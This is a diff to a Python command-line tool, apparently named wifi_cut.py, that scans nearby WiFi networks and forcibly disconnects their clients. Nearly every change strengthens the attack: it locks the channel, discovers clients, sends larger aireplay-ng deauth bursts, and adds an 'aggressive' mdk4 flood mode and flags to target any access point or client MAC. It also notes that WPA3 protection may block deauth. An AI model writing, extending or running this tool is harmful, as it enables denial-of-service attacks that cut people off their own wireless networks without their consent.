@@ -192,6 +192,36 @@ def resolve_monitor_iface(base: str, airmon_output: str = "") -> Optional[str]:
     return None
 
 
+def tool_exists(name: str) -> bool:
+    return run_cmd(["which", name])[0] == 0
+
+
+def normalize_channel(channel: str) -> Optional[str]:
+    if not channel:
+        return None
+    m = re.search(r"\d+", channel.strip())
+    return m.group(0) if m else None
+
+
+def lock_channel(mon_iface: str, channel: str) -> bool:
+    ch = normalize_channel(channel)
+    if not ch:
+        return False
+    code, _, _ = run_cmd(["iw", "dev", mon_iface, "set", "channel", ch])
+    return code == 0
+
+
+def is_wpa3_or_hardened(enc: str) -> bool:
+    e = enc.upper()
+    return "WPA3" in e or "WPA2" in e
+
+
+def warn_encryption(net: Network):
+    if "WPA3" in net.encryption.upper():
+        print(f"{Y}  Note: WPA3 networks may use PMF — deauth can be blocked by the AP.{RS}")
+        print(f"{GR}  Use aggressive mode (option 4) or test on WPA2/open networks.{RS}")
+
+
 def kill_conflicting_processes():
     print(f"{GR}Killing conflicting processes...{RS}")
     run_cmd(["airmon-ng", "check", "kill"], timeout=15)
@@ -293,23 +323,49 @@ def parse_airodump_csv(prefix: str) -> Tuple[Dict[str, Network], Dict[str, List[
     return networks, clients_by_bssid
 
 
-def scan_networks(mon_iface: str, duration: int = 15) -> Dict[str, Network]:
+def scan_networks(
+    mon_iface: str,
+    duration: int = 30,
+    channel: Optional[str] = None,
+    bssid: Optional[str] = None,
+    quiet_header: bool = False,
+) -> Dict[str, Network]:
     """Scan nearby WiFi networks and connected clients."""
     tmp_dir = tempfile.mkdtemp(prefix="wificut_")
     prefix = os.path.join(tmp_dir, "scan")
 
-    print(f"\n{C}Scanning wireless networks ({duration}s)...{RS}")
-    print(f"{GR}Includes routers, WiFi APs, and phone hotspots/tethering{RS}\n")
+    if not quiet_header:
+        print(f"\n{C}Scanning wireless networks ({duration}s)...{RS}")
+        if channel:
+            print(f"{GR}Locked to channel {channel}{RS}")
+        if bssid:
+            print(f"{GR}Filtering BSSID {bssid}{RS}")
+        print(f"{GR}Includes routers, WiFi APs, and phone hotspots/tethering{RS}\n")
+
+    ch = normalize_channel(channel or "")
+    if ch:
+        lock_channel(mon_iface, ch)
+
+    cmd = [
+        "airodump-ng", "--band", "abg", "--output-format", "csv",
+        "--write-interval", "1", "-w", prefix,
+    ]
+    if ch:
+        cmd.extend(["-c", ch])
+    if bssid:
+        cmd.extend(["--bssid", bssid])
+    cmd.append(mon_iface)
 
     proc = subprocess.Popen(
-        ["airodump-ng", "--band", "abg", "--output-format", "csv", "-w", prefix, mon_iface],
+        cmd,
         stdout=subprocess.DEVNULL,
         stderr=subprocess.PIPE,
     )
 
+    label = f"ch{ch}" if ch else "all channels"
     for i in range(duration):
         remaining = duration - i
-        print(f"\r  {GR}Scanning on {mon_iface}... {remaining:2d}s remaining{RS}", end="", flush=True)
+        print(f"\r  {GR}Scanning {label} on {mon_iface}... {remaining:2d}s remaining{RS}", end="", flush=True)
         time.sleep(1)
 
     proc.send_signal(signal.SIGINT)
@@ -323,18 +379,27 @@ def scan_networks(mon_iface: str, duration: int = 15) -> Dict[str, Network]:
     if proc.stderr:
         scan_err = proc.stderr.read().decode("utf-8", errors="replace").strip()
 
-    time.sleep(1)  # allow airodump-ng to flush CSV
+    time.sleep(1)
 
-    print(f"\r  {G}Scan complete!{RS}                         ")
+    if not quiet_header:
+        print(f"\r  {G}Scan complete!{RS}                         ")
 
-    networks, _ = parse_airodump_csv(prefix)
+    networks, clients_by_bssid = parse_airodump_csv(prefix)
 
-    if not networks:
+    for bssid_key, clients in clients_by_bssid.items():
+        if bssid_key in networks:
+            networks[bssid_key].clients = clients
+        elif bssid and bssid_key == bssid:
+            networks[bssid_key] = Network(
+                bssid=bssid_key, channel=ch or "", power="", encryption="", essid="", clients=clients,
+            )
+
+    if not networks and not quiet_header:
         if scan_err:
             print(f"{Y}  airodump-ng: {scan_err}{RS}")
         ap_file = f"{prefix}-01.csv"
         if not os.path.exists(ap_file):
-            print(f"{Y}  No scan data file — interface '{mon_iface}' may be invalid.{RS}")
+            print(f"{Y}  No scan data — interface '{mon_iface}' may be invalid.{RS}")
             print(f"{Y}  Try: sudo python3 wifi_cut.py --check{RS}")
 
     for f in Path(tmp_dir).glob("*"):
@@ -342,6 +407,29 @@ def scan_networks(mon_iface: str, duration: int = 15) -> Dict[str, Network]:
     os.rmdir(tmp_dir)
 
     return networks
+
+
+def discover_clients(
+    mon_iface: str,
+    bssid: str,
+    channel: str,
+    duration: int = 25,
+) -> List[Client]:
+    """Channel-locked scan to find clients on a specific AP."""
+    print(f"\n{C}Discovering clients on channel {channel} ({duration}s)...{RS}")
+    networks = scan_networks(
+        mon_iface,
+        duration=duration,
+        channel=channel,
+        bssid=bssid,
+        quiet_header=True,
+    )
+    if bssid in networks:
+        found = networks[bssid].clients
+    else:
+        found = []
+    print(f"  {G}Found {len(found)} client(s){RS}")
+    return found
 
 
 def display_networks(networks: Dict[str, Network]):
@@ -392,61 +480,124 @@ def display_clients(net: Network):
     print()
 
 
-def deauth_attack(
+def run_aireplay_deauth(
     mon_iface: str,
     bssid: str,
+    count: int,
     client_mac: Optional[str] = None,
-    count: int = 0,
-    interval: float = 1.0,
-):
-    """
-    Send deauth frames to disconnect clients.
-    count=0 means continuous attack until user interrupts.
-    """
-    target_desc = client_mac if client_mac else "all connected clients"
-    print(f"\n{R}{BD}▶ Disconnecting: {target_desc}{RS}")
-    print(f"{GR}  Target AP: {bssid}{RS}")
-    if count == 0:
-        print(f"{Y}  Mode: continuous (Ctrl+C to stop){RS}")
-    else:
-        print(f"{GR}  Sending {count} deauth burst(s){RS}")
-
-    cmd = ["aireplay-ng", "-0"]
-    if count == 0:
-        cmd.append("0")
-    else:
-        cmd.append(str(count))
-    cmd.extend(["-a", bssid])
+) -> Tuple[int, str, str]:
+    cmd = ["aireplay-ng", "-0", str(count), "-a", bssid]
     if client_mac:
         cmd.extend(["-c", client_mac])
     cmd.append(mon_iface)
+    return run_cmd(cmd, timeout=count + 15)
+
+
+def start_mdk4_deauth(mon_iface: str, bssid: str, channel: str) -> Optional[subprocess.Popen]:
+    if not tool_exists("mdk4"):
+        return None
+    ch = normalize_channel(channel)
+    if not ch:
+        return None
+    list_path = os.path.join(tempfile.gettempdir(), f"wificut_{bssid.replace(':', '')}.blacklist")
+    with open(list_path, "w", encoding="utf-8") as f:
+        f.write(bssid + "\n")
+    try:
+        return subprocess.Popen(
+            ["mdk4", mon_iface, "d", "-B", list_path, "-c", ch, "-s", "250"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+    except OSError:
+        return None
+
+
+def deauth_attack(
+    mon_iface: str,
+    bssid: str,
+    channel: Optional[str] = None,
+    client_mac: Optional[str] = None,
+    count: int = 0,
+    interval: float = 0.3,
+    aggressive: bool = False,
+    known_clients: Optional[List[str]] = None,
+):
+    """Send deauth/disassoc frames to disconnect clients."""
+    target_desc = client_mac if client_mac else "all connected clients"
+    print(f"\n{R}{BD}▶ Disconnecting: {target_desc}{RS}")
+    print(f"{GR}  Target AP: {bssid}{RS}")
+
+    ch = normalize_channel(channel or "")
+    if ch:
+        if lock_channel(mon_iface, ch):
+            print(f"{GR}  Locked channel: {ch}{RS}")
+        else:
+            print(f"{Y}  Warning: could not lock channel {ch}{RS}")
+
+    burst = 64 if aggressive else 32
+    mdk4_proc: Optional[subprocess.Popen] = None
+
+    if aggressive:
+        mdk4_proc = start_mdk4_deauth(mon_iface, bssid, channel or "")
+        if mdk4_proc:
+            print(f"{GR}  mdk4 deauth flood active{RS}")
+        elif tool_exists("mdk4"):
+            print(f"{Y}  mdk4 available but could not start flood{RS}")
+        else:
+            print(f"{GR}  Install mdk4 for stronger attacks: sudo apt install mdk4{RS}")
+
+    def attack_round():
+        total = 0
+        if client_mac:
+            code, out, err = run_aireplay_deauth(mon_iface, bssid, burst, client_mac)
+            total += burst
+            if code != 0 and err:
+                print(f"{Y}  aireplay-ng: {err.strip()}{RS}")
+        else:
+            code, out, err = run_aireplay_deauth(mon_iface, bssid, burst)
+            total += burst
+            for mac in known_clients or []:
+                run_aireplay_deauth(mon_iface, bssid, 16, mac)
+                total += 16
+        return total
 
     if count == 0:
-        burst = 10
+        print(f"{Y}  Mode: continuous (Ctrl+C to stop){RS}")
         total_sent = 0
         try:
             while True:
-                burst_cmd = ["aireplay-ng", "-0", str(burst), "-a", bssid]
-                if client_mac:
-                    burst_cmd.extend(["-c", client_mac])
-                burst_cmd.append(mon_iface)
-                code, out, err = run_cmd(burst_cmd, timeout=burst + 10)
-                total_sent += burst
-                print(f"\r  {R}Deauth bursts sent: {total_sent}{RS}", end="", flush=True)
+                total_sent += attack_round()
+                print(f"\r  {R}Deauth frames sent (approx): {total_sent}{RS}", end="", flush=True)
                 time.sleep(interval)
         except KeyboardInterrupt:
             print(f"\n{Y}  Attack stopped.{RS}")
+        finally:
+            if mdk4_proc:
+                mdk4_proc.terminate()
+                try:
+                    mdk4_proc.wait(timeout=3)
+                except subprocess.TimeoutExpired:
+                    mdk4_proc.kill()
     else:
-        code, out, err = run_cmd(cmd, timeout=count * 3 + 30)
-        if code == 0:
-            print(f"{G}  Deauth attack complete.{RS}")
-        else:
-            print(f"{R}  Attack may have failed: {err or out}{RS}")
+        rounds = max(1, count // burst)
+        print(f"{GR}  Sending ~{rounds * burst} deauth frames ({rounds} round(s)){RS}")
+        for r in range(rounds):
+            attack_round()
+            if r < rounds - 1:
+                time.sleep(interval)
+        if mdk4_proc:
+            time.sleep(2)
+            mdk4_proc.terminate()
+            try:
+                mdk4_proc.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                mdk4_proc.kill()
+        print(f"{G}  Deauth attack complete.{RS}")
 
 
 def interactive_mode(mon_iface: str):
     while True:
-        networks = scan_networks(mon_iface, duration=15)
+        networks = scan_networks(mon_iface, duration=30)
         display_networks(networks)
 
         if not networks:
@@ -473,36 +624,53 @@ def interactive_mode(mon_iface: str):
             print(f"{R}Please enter a number{RS}")
             continue
 
+        warn_encryption(target)
+        target.clients = discover_clients(
+            mon_iface, target.bssid, target.channel, duration=25,
+        )
         display_clients(target)
 
+        client_macs = [c.mac for c in target.clients]
+
         print(f"{BD}Disconnect options:{RS}")
-        print(f"  1. Disconnect all clients on this WiFi")
+        print(f"  1. Disconnect all clients (standard)")
         print(f"  2. Disconnect a specific client")
         print(f"  3. Continuous disconnect (until stopped)")
+        print(f"  4. Aggressive disconnect (mdk4 + channel lock + flood)")
+        print(f"  5. Re-scan clients (30s)")
         print(f"  0. Back to scan")
 
         opt = input(f"{C}Choose action: {RS}").strip()
 
         if opt == "0":
             continue
+        elif opt == "5":
+            target.clients = discover_clients(
+                mon_iface, target.bssid, target.channel, duration=30,
+            )
+            display_clients(target)
+            continue
         elif opt == "1":
-            count = input(f"{C}Deauth burst count (default 20): {RS}").strip()
-            count = int(count) if count.isdigit() else 20
-            deauth_attack(mon_iface, target.bssid, count=count)
+            count = input(f"{C}Deauth burst count (default 64): {RS}").strip()
+            count = int(count) if count.isdigit() else 64
+            deauth_attack(
+                mon_iface, target.bssid, channel=target.channel,
+                count=count, known_clients=client_macs,
+            )
         elif opt == "2":
             if not target.clients:
-                print(f"{Y}No clients detected — disconnecting all{RS}")
-                deauth_attack(mon_iface, target.bssid, count=20)
+                print(f"{Y}No clients detected — use option 1 or 4{RS}")
             else:
                 csel = input(f"{C}Select client #: {RS}").strip()
                 try:
                     ci = int(csel)
                     if 1 <= ci <= len(target.clients):
-                        count = input(f"{C}Deauth burst count (default 20): {RS}").strip()
-                        count = int(count) if count.isdigit() else 20
+                        count = input(f"{C}Deauth burst count (default 64): {RS}").strip()
+                        count = int(count) if count.isdigit() else 64
                         deauth_attack(
                             mon_iface,
                             target.bssid,
+                            channel=target.channel,
                             client_mac=target.clients[ci - 1].mac,
                             count=count,
                         )
@@ -511,7 +679,15 @@ def interactive_mode(mon_iface: str):
                 except ValueError:
                     print(f"{R}Please enter a number{RS}")
         elif opt == "3":
-            deauth_attack(mon_iface, target.bssid, count=0)
+            deauth_attack(
+                mon_iface, target.bssid, channel=target.channel,
+                count=0, known_clients=client_macs,
+            )
+        elif opt == "4":
+            deauth_attack(
+                mon_iface, target.bssid, channel=target.channel,
+                count=0, aggressive=True, known_clients=client_macs,
+            )
         else:
             print(f"{R}Invalid option{RS}")
 
@@ -598,7 +774,9 @@ Examples:
     )
     parser.add_argument("-i", "--interface", help="Wireless interface (e.g. wlan0)")
     parser.add_argument("--check", action="store_true", help="Run diagnostics (no attack)")
-    parser.add_argument("--scan", type=int, default=15, metavar="SEC", help="Scan duration in seconds")
+    parser.add_argument("--scan", type=int, default=30, metavar="SEC", help="Scan duration in seconds")
+    parser.add_argument("--channel", help="Lock scan/attack to channel (e.g. 6)")
+    parser.add_argument("--aggressive", action="store_true", help="Use mdk4 flood + heavy deauth")
     parser.add_argument("-b", "--bssid", help="Target AP BSSID")
     parser.add_argument("-c", "--client", help="Target client MAC (optional)")
     parser.add_argument("--deauth-all", action="store_true", help="Disconnect all clients on AP")
@@ -649,9 +827,27 @@ Examples:
     try:
         if args.bssid and (args.deauth_all or args.client or args.continuous):
             count = 0 if args.continuous else args.deauth_count
-            deauth_attack(mon_iface, args.bssid, args.client, count=count)
+            ch = args.channel
+            if not ch:
+                nets = scan_networks(mon_iface, duration=10, bssid=args.bssid)
+                if args.bssid in nets:
+                    ch = nets[args.bssid].channel
+            clients = []
+            if args.bssid and ch:
+                clients = [c.mac for c in discover_clients(mon_iface, args.bssid, ch, 20)]
+            deauth_attack(
+                mon_iface,
+                args.bssid,
+                channel=ch,
+                client_mac=args.client,
+                count=count,
+                aggressive=args.aggressive or args.continuous,
+                known_clients=clients,
+            )
         elif args.bssid:
-            networks = scan_networks(mon_iface, args.scan)
+            networks = scan_networks(
+                mon_iface, args.scan, channel=args.channel, bssid=args.bssid,
+            )
             if args.bssid in networks:
                 display_clients(networks[args.bssid])
             else:
